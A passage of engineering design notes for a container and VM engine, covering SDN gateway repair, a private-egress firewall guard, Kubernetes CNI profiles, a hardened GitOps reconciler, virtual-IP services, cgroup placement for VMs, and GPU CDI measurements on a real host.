  The engine never creates a controller: one that the cluster does not list is refused before any
  write (DX-1380), and the provider refuses by name what it cannot serve
  (`IpamProvider::refuse_unsupported`: only `pve`; phpIPAM by the node's `die`; NetBox up to the D1.3
  spike). `ipam` is a cold field — the node refuses to change it with subnets.
- **`subnets` became identity only** (vnet|CIDR, cold). The gateway and the ranges live in the
  HOT field `subnetSettings`, read from the provider: a change in the manifest or made by hand on the node
  converges in place (`set_sdn_subnet_addressing`, exact target; `delete=dhcp-range` clears the
  ranges, measured; `delete=gateway` not measured). One rule decides what is identity and what is
  adjustment: `delonix_networking::ipam::subnet_change`.
- **A gateway in staging moves the IPAM's gateway entry the instant of the `PUT`, and the rollback
  does not give it back.** The repair (`repair_gateways`, the ledger's `repair_gateways` step) runs after
  a failed transaction and before the transaction of an apply that follows an interrupted run.
  **The sequence the ADR described was incomplete** (measured): move-and-come-back puts an entry
  on the right gateway and LEAVES the old one, still marked gateway — two entries, and the node refuses to delete
  the subnet («not empty»). The repair frees the others with `DELETE …/ips` and re-reads exactly one.
  `Client::sdn_discarded_change` holds the lock and ALWAYS rolls back: nothing from the repair stays staged.
- **A new gateway over an address that an IPAM entry holds is refused before the `PUT`**
  (D2.4). The reservations come out AFTER the subnets, so releasing a reservation and moving the gateway to
  its address are two applies.
- Proof: `tests/live.rs::a_subnet_changes_in_place_and_a_rolled_back_gateway_entry_is_repaired`
  (injected and repaired failure) and the cycle through the CLI in the two-node lab, with a NATURAL
  failure (two subnets, the second refused by D2.4 within the same transaction).
- **The plan reads the IPAM's gateway entries** (D2.3, 2026-10-12): `gatewayEntries` is a HOT field
  of the `NetworkZone`, read from the same status that `observe()` already read. Before, a gateway
  entry released or moved by hand planned `=` and `--detailed-exitcode` exited 0. The plan and the
  repair share ONE rule (`gateway_entry_mismatches`: a subnet in force has exactly one
  entry, on its gateway in force), so that the subnet the plan names is the one the repair touches; and
  the IPAM's fingerprint now includes them. Proven on the fake node; the live case
  (`the_plan_reads_a_gateway_entry_released_or_moved_by_hand_…`) is left for the lab.

## Egress to private space: a node guard on the holder's uplink (`denyPrivateEgress`, 2026-10-11)

- **The finding.** `fwguard` only denies `169.254.0.0/16` and `127.0.0.0/8`. Everything else that the
  host reaches — the node's LAN, the management APIs of the host and the neighbours — a workload on an
  engine network reached too, because the uplink is slirp and slirp connects from the host.
- **The form: node policy, not IPs in code.** `denyPrivateEgress` (ceiling, off by
  default — rule 3 of the policy: a field that nobody sets never starts refusing) and
  `allowedEgressPrefixes` (grant, only from the node policy). The `-bin` translates the policy
  into a `delonix_sdn::infra::PrivateEgressGuard` (`policy::private_egress_guard_of`, pure) and
  delivers it with `set_private_egress_guard`; `delonix-sdn` does not read the policy, it only applies
  what it receives.
- **Where it lives.** Its own base chain, `fwprivate`, priority **-15**: after `fwguard`
  (-20, unconditional) and BEFORE `fwdeny` (-10). A `drop` here is final in all the following
  chains, so neither a network `allowlist:` nor a workload `egress allow` reopens the
  range; an `accept` (grant) only ends THIS chain, and the network and workload policy
  keep deciding. Rules: `ct state established,related accept` (responses to LAN clients
  on a published port), one rule per grant (grants may overlap and
  `nft` refuses overlapping ranges in a set), and
  `oifname "tap0" ip daddr { 10/8, 100.64/10, 172.16/12, 192.168/16 } counter drop`
  (`warn` = `counter` without verdict).
- **The workload network and the networks routed to it never match, and it is STRUCTURAL**: all
  the rules are anchored in `oifname "tap0"`, and traffic between the holder's bridges leaves
  through a bridge. An overlay leaves through its own device and the encapsulated traffic is holder output,
  not forward. Test: `the_own_network_and_a_routed_network_are_never_matched`, which reads the
  TEXT of the script with a minimal interpreter of the grammar the generator writes.
- **Registry and delivery.** `<root>/ingress/private-egress.json`, written only when it changes (and
  never created on a node that never asked for the guard). The holder applies it when building OR
  reattaching the netns (`reattach_or_setup_infra_netns`, with `?`); the host brings a live holder
  into the registry via `nsenter` (`ensure_private_egress_guard_current`, the same mechanism as
  `ensure_fw_dispatch_current`, which now share `nft_in_pin`), with a stamp per pin
  with the hash of the script — it also reaches a control plane of an older binary. An
  unreadable registry **fails closed** (everything refused, nothing granted).
- **When it syncs**: `apply` of `RuntimePolicy`, `policy unset`, and each `container run`
  (covers the hand-edited `policy.json`). `ensure_up` applies the REGISTRY on each attach.
- **What it does NOT cover**: `--net host` and the container with its own slirp (without `--net`, only
  `-p`) do not pass through the holder's uplink — the `POLICY-EGRESS-HOST-NET-OPEN` lint asks for
  `denyHostNetwork: true` alongside (admission counts both as host network). The libvirt VMs
  on the `nat` network also don't. `vm create` does not sync the policy (it only reads the
  registry via `ensure_up`).

## A cluster's pod network is a selectable PROFILE (ADR-0078, 2026-10-15)

**What was broken, and stated at length: this engine could not create a working multi-node
kubeadm cluster.** `spec.cni` accepted `default` — a
`bridge`+`host-local`+`portmap` conflist local to the node, **refused above ONE node** (DX-6701) because
it does not route pods between nodes — and `none`, which installs nothing and leaves all nodes
`NotReady`. The refusal was honest; it was a refusal. It is gap #1 of the KaaS audit
(`docs/discovery/kaas-matrix-2026-10-08.md`), which notes that the «node `Ready`» state was
*structurally unreachable* by this path.

> **Amendment (2026-10-27).** DX-6701 no longer fires: on multi-node kubeadm the
> `cni: default` **resolves to Cilium** (`net_profiles::resolved_profile`), the
> cross-node default, installed and awaited by the bootstrap without opt-in. A single node
> keeps the bridge; `mode: kind` keeps kindnet. The two CRI defects
> that blocked Cilium are fixed — bpffs (#869/#871) and the pod-identity `CNI_ARGS`
> (this session: `delonix-sdn/cni.rs` + `delonix-cri`
> `lifecycle.rs`, without which pods stayed in `reserved:init` and the
> cross-node was isolated). Cilium's D7 PROVEN live: nodes Ready, pod-to-pod
> cross-node and services. See ADR-0078 (amended) and
> `reports/cilium-d7-rerun-2026-10-27/`.

Now `spec.cni` accepts `default | none | cilium | calico | flannel`, and a new
`spec.network` block expresses *how* (`dataplane`, `kubeProxy`, `mtu`, `nodeMtu`,
`ipFamily`, `interface`, `multus`, `hubble`, `experimental`, `offline`). Two modules,
split pure/impure on purpose: `cmd/net_profiles.rs` decides everything that is decided without
touching a host (tested without a host), `cmd/net_profiles_install.rs` fetches, renders, applies
and **waits**. It is the split that lets a bad cluster be refused before a
machine exists — and that is why `cluster kubeadm`, the path that CREATES VMs, validates the whole
network request on the first line.

**The three profiles are born EXPERIMENTAL, and the gate is declarative.** Refused (DX-1705) unless
the manifest says `spec.network.experimental: true` (or `--experimental-cni`), and
the refusal carries the REASON. The reason is not generic caution: the «what was not measured» section
of ADR-0074 says it in writing — *«A real cluster CNI (Calico, Cilium) declaring the
capability differently, and more than one node, were not measured»*. Cilium is the profile
this engine wants, and that is precisely why it does not declare itself supported before
measuring it.

**Seven new refusals, all before a machine exists.** DX-1701 (a `cni` that does not exist —
and the message lists the ones that do), DX-1702 (a knob that the profile ignores, including
any knob under `cni: default`/`none`), DX-1703 (MTU that does not fit the encapsulation),
DX-1704 (malformed CIDR, with bits outside the prefix, overlapping itself or a network of this
host, or too small for the nodes), DX-1705 (experimental without consent), DX-1706
(`ipFamily` other than `ipv4` — stated as **not implemented**, with ADR-0065 named),
DX-6703 (changing a live cluster's CNI: the cluster stays **untouched**), DX-6704 (artifact
that was not fetched or whose bytes do not match).

Two are worth the explanation:

- **MTU is a refusal and not a warning** because an MTU that does not fit *does not fail*: the dataplane comes
  up and drops the large packets silently, which reads as unexplained slowness. The
  `docs/guia-rede.md` already recorded the pitfall for the engine's own encrypted overlay.
- **`valid_cidr` was a CHARACTER-SET check** — for a solid reason
  (the value goes into a remote `bash -c`) — and so `9`, `1.2.3.4`, `///` and
  `0.0.0.0/99` all passed as `podSubnet`, with the failure arriving later, from `kubeadm`,
  on a host. The charset defense stayed; arithmetic was added on top.

**To install is to wait.** A profile is considered installed when its agent is `Ready`
on ALL nodes **and** all nodes are `Ready` — and a profile **always waits**,
regardless of `--copy-kubeconfig` (that flag exists to preserve the timing of
a path that installed no CNI; a path that just installed one and did not look
is the failure in its purest form). A timeout is an **error with the counts**, not a warning, and **does not
delete nor reapply anything**: a half-installed CNI is the only evidence that explains the failure. The
installation happens **between `init` and the joins**, as kubeadm asks.

**The `kubeadm --config` stopped being only for external etcd.** It is now generated also for
`kubeProxy: ipvs` (a `KubeProxyConfiguration`) and `kubeProxy: none`
(`skipPhases: addon/kube-proxy` — because installing the kube-proxy and letting a CNI
replace it leaves two owners of the services dataplane). `stacked` + `iptables` stays
on the flat flags, byte for byte.

**On the golden.** The CNI plugins were whatever `pkgs.k8s.io` published that day: the only
supplier was the `.deb` `kubernetes-cni`, arriving as a dependency of the kubelet, with no name in the
build and **with no pinned version on purpose** (the `VERSIONED` of `download_k8s_debs` covers only
`kubeadm`/`kubelet`/`kubectl`). Now there is an explicit, digest-verified subset
of `containernetworking/plugins` 1.9.1 — ten plugins, each with the reason written, and the
eight that no profile reaches (`dhcp`, `vlan`, `vrf`, …) **do not go**. Further: profile modules and
sysctls in the SHARED `k8s_recipes` catalog (the golden and a live-prepared host must not
diverge), diagnostics the cloud image does not carry (`ethtool`, `conntrack`,
`tcpdump`), and provenance (`DELONIX_CNI_PLUGINS`, `DELONIX_NET_PROFILES`) in the
`/etc/delonix-image-release`.

**The golden still carries NO conflist, and it is deliberate:** the kubelet picks the
first file in `/etc/cni/net.d` by lexical order, and a generic bridge in there
would be chosen **before** the intended CNI.

**What the image does not configure, it verifies.** It does not mount bpffs nor touch the cgroup — both
things are already true on these distributions, and writing over a system that works
to satisfy a checklist breaks what did not need touching. Instead, the
`dist/delonix-node-preflight.sh` measures them (and the modules, the sysctls, the CRI socket, the
plugins that that chain runs, the vxlan, the kernel ≥ 5.10 for Cilium, the `rp_filter`
for Calico), reports **all** the failures, and **never exits 0 for having failed to measure**.
`prepare_host` runs it before kubeadm and pushes it to a node whose golden predates it.

**BUG FOUND by the test that reads the REAL manifests.** The substitution of Flannel's MTU
did not match anything: the `kube-flannel.yml` v0.28.10 **has no `MTU` key**. Flannel would have
autodetected the node's MTU and each pod would pay the VXLAN header twice — exactly the
failure the overhead calculation exists to prevent, defeated by a substitution written
from an assumption. **The excerpt tests always passed**, because the excerpt was
written with the same assumption. It is the lesson to take: an excerpt test proves the algorithm and
nothing about the file.

**What was NOT validated.** No profile was exercised against this CRI across several nodes. It was
not for lack of will nor of environment: the host had **5 GiB free of 938 GiB (100%
used)**, and filling the root of a shared machine to produce a measurement is not an
acceptable trade. The network policies were **not** tested. The reproducible procedure,
with the per-profile acceptance criteria, is in `docs/network-compatibility.md` — and until
it runs, none of this should be read as «it works».

**Two findings out of scope, reported and not fixed** (so as not to conflict with
work from other sessions): `--extra-package` is silently discarded on the offline
path of the golden build, and `k8s_repo_version` has an independent default
(`stable:/v1.31`) that disagrees with `DEFAULT_K8S_VERSION` (1.36).

## `kind: GitOpsSource` — the pull pass without a daemon (ADR-0021, 2026-10-12)

- **One pass, no resident process**: a user systemd timer per source
  (`delonix-gitops-<ns>.<name>`, `Type=oneshot`, with random delay) runs `gitops reconcile`:
  fetch `--depth=1` of the ref, verification, `stack plan`, store, apply with the plan's digests,
  record of the applied commit and an event. A second trigger with the previous pass alive SKIPS
  (non-blocking `flock` per source) and says so. Verbs: `gitops reconcile|status|suspend|resume`;
  `suspend` is a local mark, outside the spec.
- **A refused commit applies NOTHING and gets recorded**: YAML with a duplicate key, a broken
  graph, a forbidden document or an action the policy does not allow (DX-1602/1604) leave
  the stack as it was, with the last applied commit intact. Measured: four refused commits,
  the same PID and the same `memory.max`.
- **The source is untrusted input** — the security pass is written in ADR-0021. git
  runs with `env_clear()`, a private HOME, no system nor global config, no hooks, only
  `file`/`https`/`ssh`, `fsckObjects`, no redirects nor credential helpers, a 120 s ceiling. Nothing
  is checked out: the tree is read via `ls-tree`/`cat-file` and only regular files pass
  (symlinks, submodules, LFS pointers and private keys refuse the commit). Ceilings: 4096
  entries, 256 manifests, 1 MiB per file, 8 MiB total, 512 documents, 256 MiB of
  mirror. Signatures only SSH (`allowed_signers`); GPG is refused.
- **What a repo may declare**: `RuntimePolicy`, `Secret`, `App` and `Image` with `build:` never;
  VM, SystemContainer, NetworkZone, NetworkGateway, StoragePool, Gateway and IPPool only listed in
  `safety.kinds`. A container does not ask for privilege, host network/PID/IPC, bind mounts,
  devices, GPU, `capAdd`, unconfined profiles nor `envFile`; a Volume is simple local and a
  Network is bridge. The documents land in the source's namespace. **A container coming from a
  source has to name a network**: the flat form without a network is `host`, which the guard refuses.
- **Plan policy**: `Create`/`Update`/`NoOp` by default; `Adopt`/`Replace`/`Reboot` only with
  `safety.allow`; `Conflict` always refused; `Delete` only with `prune: true`, below
  `maximumDeletes` and never over `protectedResources`. A source declares only itself, and the
  repo only changes its `ref`/`path`/`interval`; a pass never prunes a source. `Conflict` always
  refused, with ONE exception: the record of the source itself, when the repo declares itself
  (see the bootstrap stack, below).
- **The bootstrap stack and the passes' stack are two, never the same (2026-10-14).** Measured before:
  with the source applied by `stack apply --name <source>` and the passes' stack calling itself, by
  default, like the source, `stack plan` gave rc=2 forever and an `apply --prune` deleted the
  Volume that the next pass recreated EMPTY. Now `spec.stack` defaults to
  `gitops.<namespace>.<name>` (a DNS label has no dots, so no `spec.stack` nor a
  normal `--name` writes it), and `stack apply`/`plan`/`prune`/`rollback`/`validate` refuse with
  DX-1601, before reading the machine, a manifest that declares a source whose passes fall in the
  stack where the command acts. Only the pass is exempt, by an explicit argument
  (`Applier::Pass`), never by an environment variable. When the repo declares itself, the
  pass takes the source's record from the bootstrap stack («taken over from stack …») and gives it back if
  the second look refuses the commit; from then on the bootstrap owns nothing, and changing a
  non-mutable field of a self-managed source is `delete gitopssources` and bootstrapping again.
- **Not validated**: a real systemd timer firing, recovery after a reboot, the
  validation on a golden VM, and end-to-end `ssh://`/`https://` fetches. To do (refused
  as unknown fields): `selfHeal`, `wait`, `healthTimeout`, backoff, Prometheus metrics,
  and the ADR's `gitops bootstrap`/`rm`/`history` verbs.

## `kind: Service type VirtualIP` — the L4 VIP with readiness (ADR-0066, 2026-10-12)

- **`type: DNS|VirtualIP`** (default `DNS`, which compares only `matchLabels`/`port` as before). A
  `VirtualIP` leases an address from the pool (`<root>/ingress/vip-pool`, or `DELONIX_SERVICE_VIP_CIDR`;
  `network vip-pool set|clear|show`) as a lease `svc:<ns>/<name>` in the IPAM, and the DNS answers ONE
  A record — the VIP. `type`/`vip`/`readiness`/`publish` are HOT fields: changing them rewrites the
  record and the dataplane, without recreating anything.
- **The pool is refused before serving**: private IPv4, `/16`–`/29`, host bits at zero, no
  overlap with another pool, with engine networks, CNI `subnet`s, the kind's `podSubnet`/`serviceSubnet`,
  host addresses and routes (VPN and wg included), the slirp `10.0.2.0/24` nor the `delonix0`
  (DX-5360). Without a pool, DX-6360; a VIP outside the pool, DX-1361; without `bridge-nf-call-iptables`,
  DX-6361 (the hairpin depends on it). The overlap check runs on `apply`, not on `plan`.
- **Four own chains on the holder**, alongside the order that already existed (`fwguard` -20,
  `fwprivate` -15, `fwdeny` -10, `fwcont` -5, policy 0): `svcpre`/`svcout` (nat, -101) do the
  DNAT of the VIP to the READY backends, `vipguard`/`vipguardout` (filter, -20) refuse what the VIP
  does not serve. Rewritten with `flush` in a single `nft -f`. Namespace isolation and anti-spoof
  still hold for the VIP's traffic (measured: forging the source gives `svcpre` +0).
- **Fail-closed readiness**: a prober in the control process (500 ms) reads the container
  records on each round and applies `readiness.tcp` with `successThreshold`/`failureThreshold`;
  only a backend that is `Running`, `healthy` if it has a health check, and with the port
  responding enters rotation. **Deviation from the ADR (D7)**: the 500 ms re-read replaces the event-driven
  trigger. Holder verbs: `svcsync` and `svc-state` (read only); `nsleave` removes the address from all maps
  before a detach returns. With no ready backend the VIP refuses right away (RST), it never hangs.
- **`spec.publish`** takes host ports to the same set of backends; `start_slirp` re-publishes
  them after a respawn.
- **BREAKING for whoever uses `delonix-sdn` as a library (D9)**: `lbset`/`lbclear`,
  `set_service_lb*`, `clear_service_lb` and `service_vip` (also in `delonix-net-rules`) are gone, and the
  DX-1329/DX-1330 codes (replaced by DX-1361).
- **Measured live** (isolated roots, busybox httpd backends): spread 34/26 across 60 connections,
  `counter packets 60` on `svcpre`; closed port → ejected in 2.6–3.9 s and 0/60 after;
  readmitted 0.66 s after reopening; `container rm` → 0/60; control plane killed → 30/30
  served by the pin's ruleset. `service_lb` chaos scenario.
- **Not validated**: the whole battery (only the new section), a golden VM, the `svcout` path for a
  client on the holder itself (the L7 proxy). **ADR-0065 (IPv6) has not started**: P1 passes all
  rules to `table inet` and needs its own session.

## The cgroup group also holds as root, and the Cloud Hypervisor VMM is born in a leaf (ADR-0079, proposed)

**Two accepted and unenforced ceilings, both with rc=0.** The `cgroup_parent` (ADR-0015) only existed
on the delegated rootless path: in root mode `setup_cgroup` used `Container::cgroup()` =
`delonix.slice/delonix-<id>` and never read the group — whoever put all the steps of a job under
a group to limit them together had no ceiling at all as root. And the Cloud
Hypervisor VMM ran in the cgroup of whoever launched it: the VM's vCPUs and memory were not anyone's `cpu.max`/
`memory.max`.

- **`Container::cgroup()` became `delonix.slice/<group>/delonix-<id>`** (`root_cgroup_path`,
  pure). As root, `ensure_root_group` creates the group, writes the ceiling (normalized: `64Mi` becomes
  bytes) and passes `memory cpu pids` to the children BEFORE the leaf; any failure is `DX-6102`. Since the
  static path changed, the removal, the CRI statistics and `container_pids` follow on their own.
- **An invalid group is REFUSED in both modes** (`DX-1116`), at the top of `spawn` (nothing cloned)
  and again in `setup_cgroup`. Before, rootless DISCARDED the unsafe name and started the
  container with no group — the `an_unsafe_group_name_*` test changed from «does not escape» to «is refused».
- **`DEFAULT_PIDS_MAX` is public** (`delonix_compute`, re-exported by `delonix-linux`).
- **Process leaf** (`delonix_compute::cgroup_leaf` + `delonix_linux::create_process_leaf`):
  `Ok(None)` when there is nowhere to create it (an SSH session without delegation), an error when a required
  ceiling does not take hold (the leaf is deleted). The provider reaches it via the `ProcessLeaves` port, registered in
  the CLI's `main` and in the node API's `compose` — a provider cannot depend on the adapter.
- **The VMM enters the leaf between the `fork` and the `exec`** of the launcher (`pre_exec`, a `write` to an fd
  opened by the parent): it is born inside, nothing it allocates is charged elsewhere. Ceilings: vCPUs (or
  `vcpus_max`) in whole cores, memory (or `memory_max_mib`) + 128 MiB, pids
  `max(512, 2×vCPUs+64)`. Measured on CH v53.0: the VMM takes ~7 MiB with 256 MiB or 2 GiB of guest,
  7 threads for 2 vCPUs.
- **Without a leaf, the VM is REFUSED before the network** (`DX-6515`, exit 69). Valve: the same
  `DELONIX_ALLOW_UNENFORCED_LIMITS` as the containers'. **Behavior change:** a rootless CH VM
  in an SSH session without `systemd-run --user --scope -p Delegate=yes` no longer boots.

**To do:** session libvirt (the QEMU is a child of the daemon; the clean path seems to be
`virsh start --paused` → move the pid → `resume`, unmeasured), CH's rate limiters and queues
(`bw_*`/`ops_*`, `--rate-limit-group`, `num_queues`/`queue_size` exist in v53.0, but require a
persisted field for `vm start`, a manifest field and a flag), and the `OOMKilled` of a VM. Proofs to be
run: `tests/cgroup_parent.rs` (`root_mode_*`, with sudo) and `tests/process_leaf.rs` (root or
delegated scope).

## The CDI path measured on a real GPU host (RTX 4060, 2026-11-21)

The `--gpus nvidia` bullet above carried, since it was written, an open item: the precedence
`/etc/cdi` vs `/var/run/cdi` and whether `ldconfig -r` substitutes for the `createContainer` hooks
were "to be confirmed on a real GPU host (impossible in this sandbox)". A host with an NVIDIA GPU
and a generated CDI spec showed up, so it was measured. **Part of that note was already stale
before the measurement**: it points at `cmd/cdi.rs`, a path that has not existed since ADR-0040's
P3a moved the consumer to `crates/adapters/delonix-linux/src/cdi.rs` (2026-09-17), and the module's
own doc-comment already recorded a measurement against an RTX 5060 with driver 580.

**The host**: Intel Core Ultra 9 185H (16C/22T), 32 GiB LPDDR5, **two** GPUs — Intel Arc iGPU
(`i915`) and NVIDIA RTX 4060 Laptop (AD107M, 8188 MiB, 35 W cap), driver 580.178.04, CUDA 13.0,
`nvidia-ctk` **1.20.1** with `/var/run/cdi/nvidia.yaml` already generated (`cdiVersion 0.7.0`,
3 devices — `0`, `GPU-<uuid>`, `all` —, 4 top-level device nodes, **56** top-level mounts, **12**
declared hooks, and no `nvidia-caps`, so no root-only node is ever bound).

**No build was needed, and that was measured rather than assumed.** The installed binary is v5.1.1
(`a0da90f5`); the diff of its `cdi.rs` against the tree's HEAD is **one comment and four test
names/assertion messages — zero production lines**. So testing the installed binary measures the
tree's logic. It is the inverse of the trap this file already records ("two builds with the same
version are not the same build"): here two different versions are the same build of what matters,
and the way to know is to diff the file, not to compare `--version`.

**CUDA initialises for real, not just device nodes present.** `nvidia-smi` only proves NVML, so the
probe was a small C program that exercises the driver API (`dlopen libcuda.so.1` → `cuInit` →
`cuDeviceGetCount` → `cuDeviceGetName` → `cuCtxCreate` → `cuMemAlloc`). Inside an `ubuntu:24.04`
container, rootless, with `--gpus nvidia`: every call returns 0, `cuCtxCreate` builds a real context
and 16 MiB is allocated on the device — identical to the host. **And the control is what makes it a
proof**: the SAME container without `--gpus` fails at `dlopen libcuda.so.1: cannot open shared
object file`, rc=1. The result comes from the CDI edits, not from something already in the image.

**`ldconfig -r` suffices for the CUDA path.** The 12 hooks did not run (the warning came out, as
designed), and inside the container `libcuda.so.1 -> libcuda.so.580.178.04` exists anyway: creating
SONAME links is `ldconfig`'s own job, and it is what `dlopen` resolves. **What stays unmeasured is
everything past CUDA** — Vulkan/EGL/X11 need links the `create-symlinks` hook writes outside the
cache (`libglxserver_nvidia.so`, the `/dev/dri/by-path` entries), and nothing here exercised them.

**`/var/run/cdi` wins over `/etc/cdi` — and the precedence is EMERGENT, not a rule.** Measured with
two specs of the same kind and the same device name, one per directory, differing only in a marker:
the container saw the `/var/run/cdi` marker in both the mounted file and the environment variable.
But nothing in the code decides that. `CdiEdits::dedupe` is *first occurrence wins* and only
collapses **identical** entries, so two conflicting entries both survive and what decides is being
applied LAST — the bind that lands on top, and `apply_env`
(`crates/adapters/delonix-linux/src/lib.rs`), which does one `set_var` per entry, so the last value
wins by key. The right answer falls out of the scan order.

**The fragility is one line away, and it was measured too**: keying `dedupe` on the mount `target`
alone — a perfectly plausible "never mount twice on the same path" change — **inverts the precedence
to `/etc/cdi` in silence**. Reverted on purpose: `left: 1, right: 2`, survivor `/host/etc.txt`. No
test covered two directories in conflict, so it would have landed green;
`the_spec_directory_read_last_wins_a_conflicting_device` now pins it.

**`--gpus dri` works, and had a small defect of its own.** The four DRM nodes arrive and the Intel
render node **opens O_RDWR** inside the container, rootless, with zero nvidia libraries — it is the
raw glob, no CDI, as documented. But `expand_gpu_devices` globbed EVERY entry of `/dev/dri` without
filtering by type, and `/dev/dri/by-path` is a **directory**: inside the container it showed up as
`-rw-rw-r-- 1 root root 0 by-path`, an empty regular file where the host has a directory of
symlinks. Nothing reads it today, but it is exactly the path the `create-symlinks` hook populates.
Corrected in `fix(cdi): o glob do --gpus dri só entrega nós de dispositivo`, on its own branch
because the defect is on the published line; `/dev/nvidia-caps` had the same shape in the `nvidia`
branch of the glob.

**Both refusals land before anything is created** (0 containers in each): an unknown device name
gives `DX-4102` and **exit 4** (the "does not exist" class); no spec at all gives `DX-1902` with the
full text and — the branch a GPU-less sandbox can never reach — **"`nvidia-ctk` IS installed —
generate the spec and retry"**. **Observation, not a bug**: that second one exits **1**
(*invalid argument*), while the same species of condition — "this host cannot provide what you
asked" — exits **69** elsewhere in the engine (refused controller limits, DX-6305 of isolation,
DX-6515 of the VM leaf). Defensible, since the operator fixes it with one command, but a CI gate
that distinguishes "fix the host" from "fix the argument" gets different numbers for the same kind
of thing.

**What this host does NOT let us measure**, and it bounds the above: `user@<uid>.service` delegates
only `cpu memory pids`, so `--cpuset`, `--io-weight` and the four `--device-*-bps/iops` are refused
(exit 69) — a GPU workload cannot be combined with device I/O ceilings here without the
`Delegate=` drop-in and a `user@` restart. Also unmeasured: a second vendor's spec resolved
alongside NVIDIA's on a real host, GPU passthrough to a VM, and the CRI path.

**Two traps of the measurement itself**, both cheap and both already in the catalogue: a probe
ending in `grep -c` returns 1 when the count is zero, which reads as the engine having failed
(it had not — the container was fine); and `DELONIX_ROOT=` **empty** is accepted as a state root of
`""` instead of falling back to the default, so a sloppy "measure without the isolated root" check
measures nothing. Use `env -u`.
